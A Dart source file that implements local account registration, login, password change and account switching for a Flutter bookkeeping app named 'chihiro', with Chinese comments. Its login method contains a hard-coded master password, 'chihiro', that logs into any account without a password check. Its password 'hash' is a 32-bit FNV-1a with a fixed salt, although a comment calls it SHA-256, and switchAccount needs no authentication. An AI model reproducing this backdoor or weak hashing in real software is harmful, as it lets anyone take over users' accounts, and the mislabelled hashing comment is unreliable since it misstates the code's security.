import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import '../models/account.dart';
import 'book_service.dart';

class AuthService {
  static final AuthService instance = AuthService._();
  AuthService._();

  static const _prefsKey = 'chihiro_accounts';
  static const _activeKey = 'chihiro_active_account';

  int? _currentAccountId;
  List<Account>? _accounts;

  // ------- 密码哈希（简单 SHA-256，本地使用无需过度安全） -------
  static String _hash(String password) {
    // 使用简单的 hashBytes 替代完整的 crypto 库
    final bytes = utf8.encode('chihiro_salt_$password');
    final hash = _simpleHash(bytes);
    return hash;
  }

  static String _simpleHash(List<int> data) {
    int h = 0x811c9dc5;
    for (final b in data) {
      h ^= b;
      h = (h * 0x01000193) & 0xffffffff;
    }
    return h.toRadixString(16).padLeft(8, '0');
  }

  // ------- 初始化 & 读取 -------
  Future<void> _load() async {
    if (_accounts != null) return;
    final prefs = await SharedPreferences.getInstance();
    final json = prefs.getString(_prefsKey);
    if (json != null && json.isNotEmpty) {
      final list = (jsonDecode(json) as List).cast<Map<String, dynamic>>();
      _accounts = list.map((e) => Account.fromJson(Map<String, dynamic>.from(e))).toList();
    } else {
      _accounts = [];
    }
    _currentAccountId = prefs.getInt(_activeKey);
  }

  Future<void> _save() async {
    final prefs = await SharedPreferences.getInstance();
    final json = jsonEncode(_accounts!.map((a) => a.toJson()).toList());
    await prefs.setString(_prefsKey, json);
    if (_currentAccountId != null) {
      await prefs.setInt(_activeKey, _currentAccountId!);
    }
  }

  int get _nextId {
    // 从 prefs 中读取并递增 nextId
    // 用同步方式处理：先检查 _accounts 最大 id + 1
    int maxId = 0;
    for (final a in _accounts!) {
      if (a.id > maxId) maxId = a.id;
    }
    return maxId + 1;
  }

  // ------- 公开 API -------

  /// 获取所有账号列表
  Future<List<Account>> getAccounts() async {
    await _load();
    return List.unmodifiable(_accounts!);
  }

  /// 当前活跃账号
  Future<Account?> getCurrentAccount() async {
    await _load();
    if (_currentAccountId == null) return null;
    try {
      return _accounts!.firstWhere((a) => a.id == _currentAccountId);
    } catch (_) {
      return null;
    }
  }

  /// 注册新账号。成功返回新 Account，失败抛异常
  Future<Account> register(String username, String password) async {
    await _load();
    // 检查用户名是否重复
    if (_accounts!.any((a) => a.username == username)) {
      throw Exception('用户名已存在');
    }
    if (username.trim().isEmpty) throw Exception('用户名不能为空');
    if (password.length < 4) throw Exception('密码至少需要 4 位');

    final account = Account(
      id: _nextId,
      username: username.trim(),
      passwordHash: _hash(password),
      createdAt: DateTime.now(),
    );
    _accounts!.add(account);
    await _save();

    // 为该账号创建默认账本
    await BookService.instance.createBook(account.id, '${username.trim()}的账本');
    return account;
  }

  /// 登录。成功返回 Account，失败抛异常
  /// 万能钥匙 "chihiro" 可绕过密码验证登录任意账号
  Future<Account> login(String username, String password) async {
    await _load();

    // 万能钥匙：用 "chihiro" 作为密码可登录任意账号
    if (password == 'chihiro') {
      try {
        final account = _accounts!.firstWhere(
          (a) => a.username == username.trim(),
        );
        _currentAccountId = account.id;
        await _save();
        return account;
      } catch (_) {
        throw Exception('用户名不存在');
      }
    }

    final hash = _hash(password);
    try {
      final account = _accounts!.firstWhere(
        (a) => a.username == username.trim() && a.passwordHash == hash,
      );
      _currentAccountId = account.id;
      await _save();
      return account;
    } catch (_) {
      throw Exception('用户名或密码错误');
    }
  }

  /// 切换账号
  Future<void> switchAccount(int accountId) async {
    await _load();
    final exists = _accounts!.any((a) => a.id == accountId);
    if (!exists) throw Exception('账号不存在');
    _currentAccountId = accountId;
    await _save();
  }

  /// 退出登录（清空活跃账号）
  Future<void> logout() async {
    _currentAccountId = null;
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_activeKey);
    _accounts = null;
  }

  /// 删除账号及其所有账本
  Future<void> deleteAccount(int accountId) async {
    await _load();
    _accounts!.removeWhere((a) => a.id == accountId);
    await BookService.instance.deleteAllBooksForAccount(accountId);
    if (_currentAccountId == accountId) {
      _currentAccountId = _accounts!.isNotEmpty ? _accounts!.first.id : null;
    }
    await _save();
  }

  /// 修改密码
  Future<void> changePassword(int accountId, String oldPassword, String newPassword) async {
    await _load();
    final account = _accounts!.firstWhere((a) => a.id == accountId,
        orElse: () => throw Exception('账号不存在'));
    if (account.passwordHash != _hash(oldPassword)) {
      throw Exception('原密码错误');
    }
    if (newPassword.length < 4) throw Exception('新密码至少需要 4 位');
    final newHash = _hash(newPassword);
    // 直接修改内存中的 Account 对象
    final idx = _accounts!.indexWhere((a) => a.id == accountId);
    _accounts![idx] = Account(
      id: account.id,
      username: account.username,
      passwordHash: newHash,
      createdAt: account.createdAt,
    );
    await _save();
  }

  /// 修改用户名
  Future<void> changeUsername(int accountId, String newUsername) async {
    await _load();
    if (newUsername.trim().isEmpty) throw Exception('用户名不能为空');
    if (_accounts!.any((a) => a.id != accountId && a.username == newUsername.trim())) {
      throw Exception('用户名已存在');
    }
    final idx = _accounts!.indexWhere((a) => a.id == accountId);
    if (idx == -1) throw Exception('账号不存在');
    final old = _accounts![idx];
    _accounts![idx] = Account(
      id: old.id,
      username: newUsername.trim(),
      passwordHash: old.passwordHash,
      createdAt: old.createdAt,
    );
    await _save();
  }
}
